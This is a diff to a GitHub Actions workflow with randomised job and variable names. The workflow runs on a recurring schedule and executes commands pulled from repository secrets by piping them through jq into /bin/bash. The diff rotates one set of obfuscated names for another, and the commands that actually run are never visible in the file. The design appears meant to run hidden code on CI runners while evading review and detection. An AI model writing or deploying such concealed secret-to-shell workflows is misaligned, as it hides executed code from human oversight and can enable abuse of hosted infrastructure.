@@ -1,9 +1,9 @@
 name: xu7anxa
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 3/6 * * *'
+    - cron: '13 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: xu7anxa
         env:
-          z1986: ${{ secrets.z1986 }}
+          hwtwc8: ${{ secrets.hwtwc8 }}
         run: |
-          echo $z1986 | jq -r .wagf90 | /bin/bash
-          echo $yldk41011 | jq -r .ppemk2 | /bin/bash
-          echo $fqx43 | jq -r .hpp0 | /bin/bash
-          echo $kyt84046 | jq -r .eo342 | /bin/bash
-          echo $w307 | jq -r .cgwd37 | /bin/bash
-          echo $lel49 | jq -r .mkqyf049 | /bin/bash
-          echo $lugzu0355 | jq -r .mg68218 | /bin/bash
-          echo $ajy3343 | jq -r .wp38 | /bin/bash
-          echo $xvvo7803 | jq -r .gogl1037 | /bin/bash
-          echo $tklok6893 | jq -r .jdz200 | /bin/bash
-          echo $rmqwh9941 | jq -r .c1681 | /bin/bash
+          echo $hwtwc8 | jq -r .evc80545 | /bin/bash
+          echo $smxl86957 | jq -r .kee55 | /bin/bash
+          echo $oix80 | jq -r .oqw2917 | /bin/bash
+          echo $er04 | jq -r .gyxbo035 | /bin/bash
+          echo $lxqrp5960 | jq -r .qw349 | /bin/bash
+          echo $am9 | jq -r .dwwtb89 | /bin/bash
+          echo $ljgt98 | jq -r .fsgdz9626 | /bin/bash
+          echo $eld27 | jq -r .ioyv71852 | /bin/bash
+          echo $fgn74950 | jq -r .jvai98132 | /bin/bash
+          echo $nchz04 | jq -r .imgqx4713 | /bin/bash
 
